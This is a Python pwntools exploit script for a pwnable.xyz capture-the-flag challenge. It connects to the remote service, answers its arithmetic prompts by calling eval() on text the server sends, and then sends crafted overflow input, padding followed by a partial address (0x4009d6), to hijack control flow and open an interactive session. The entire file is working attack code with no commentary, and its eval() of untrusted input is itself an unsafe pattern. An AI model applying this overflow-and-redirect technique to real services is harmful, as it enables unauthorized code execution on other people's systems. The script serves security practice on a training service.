from pwn import *
#p = process("./challenge") 
p = remote("svc.pwnable.xyz", 30009)
elf = ELF("./challenge")
def play():
	p.recvuntil("Score: ")
	p.sendlineafter(">", "1")
	expr = p.recvuntil("=").split("=")[0]
	sleep(0.2)
	ans = (str(eval(expr) & 0xffffffff - 1))
	p.sendline(ans)
	
def edit(name):
	p.recvuntil("Score: ")
	p.sendlineafter(">", "3")
	sleep(0.2)
	p.send(name)

if __name__ == "__main__":
	p.send("a" * 0x10)
	sleep(0.2)
	play()
	edit("a" * 0x10 + "\xff")
	sleep(0.2)
	p.sendline("2")
	sleep(0.2)
	edit("a"* 0x18 + "\xd6\x09\x40")
	sleep(0.2)
	p.sendline("1")
	p.interactive()


